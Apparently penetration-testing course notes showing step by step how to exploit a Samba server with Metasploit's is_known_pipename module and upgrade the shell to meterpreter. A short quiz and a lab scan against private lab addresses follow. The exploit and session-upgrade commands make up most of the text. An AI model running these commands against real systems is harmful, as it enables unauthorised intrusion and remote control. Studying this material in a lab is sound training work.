

Setup msfconsole
```
service postgresql start && msfconsole
workspace -a upgrade_shell 
setg RHOST <target_ip>
setg LHOST <local_ip>
```

Scan and enumerate target
```
db_nmap -sV <target_ip>
```

Setup exploit module
```
search type:exploit samba
use linux/samba/is_known_pipename
options
exploit
```


Setup handler to gain meterpreter 
```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter 
set SESSION <session_id>
exploit
```

Upgrade command shell to meterpreter using the sessions command
```
sessions -u <session_id>
```

## Quiz

Which one of the following Msfconsole commands can be used to upgrade a command shell to a meterpreter shell automatically?

	sessions -u

## Lab

This lab covers the process of upgrading a command shell to a meterpreter session.

```
Local Host: 192.4.150.2
Remote Host: 192.4.150.3
```


```
db_nmap -sV -O 192.4.150.3

[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```